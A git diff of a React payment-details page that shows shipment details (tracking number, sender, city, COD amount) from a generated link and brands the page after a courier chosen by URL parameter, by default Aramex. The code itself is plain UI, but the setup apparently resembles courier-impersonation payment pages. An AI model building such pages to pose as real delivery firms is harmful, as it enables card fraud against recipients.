@@ -7,18 +7,23 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
-import { CreditCard, Shield, ArrowLeft, Info, User, Mail, Phone } from "lucide-react";
+import { useLink } from "@/hooks/useSupabase";
+import { CreditCard, Shield, ArrowLeft, Info, User, Mail, Phone, Package, Hash, MapPin, DollarSign } from "lucide-react";
 
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
+  const { data: linkData } = useLink(id);
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   
-  // For demo, get service from URL or use default
-  const serviceName = new URLSearchParams(window.location.search).get('service') || 'aramex';
+  // Get service from link data or URL
+  const serviceName = linkData?.payload?.service_name || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const branding = getServiceBranding(serviceName);
+  
+  // Extract shipping info from link payload
+  const shippingInfo = linkData?.payload as any;
   
   const handleProceed = (e: React.FormEvent) => {
     e.preventDefault();
@@ -96,6 +101,43 @@ const PaymentDetails = () => {
                 </div>
               </div>
               
+              {/* Shipping Info Display */}
+              {shippingInfo && (
+                <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
+                  <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">تفاصيل الشحنة</h3>
+                  <div className="space-y-2 text-xs sm:text-sm">
+                    {shippingInfo.tracking_number && (
+                      <div className="flex items-center gap-2">
+                        <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                        <span className="text-muted-foreground">رقم الشحنة:</span>
+                        <span className="font-semibold">{shippingInfo.tracking_number}</span>
+                      </div>
+                    )}
+                    {shippingInfo.sender_name && (
+                      <div className="flex items-center gap-2">
+                        <User className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                        <span className="text-muted-foreground">المرسل:</span>
+                        <span className="font-semibold">{shippingInfo.sender_name}</span>
+                      </div>
+                    )}
+                    {shippingInfo.sender_city && (
+                      <div className="flex items-center gap-2">
+                        <MapPin className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                        <span className="text-muted-foreground">المدينة:</span>
+                        <span className="font-semibold">{shippingInfo.sender_city}</span>
+                      </div>
+                    )}
+                    {shippingInfo.cod_amount > 0 && (
+                      <div className="flex items-center gap-2">
+                        <DollarSign className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                        <span className="text-muted-foreground">مبلغ COD:</span>
+                        <span className="font-semibold">{shippingInfo.cod_amount} ر.س</span>
+                      </div>
+                    )}
+                  </div>
+                </div>
+              )}
+
               {/* Customer Info */}
               <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                 <div>
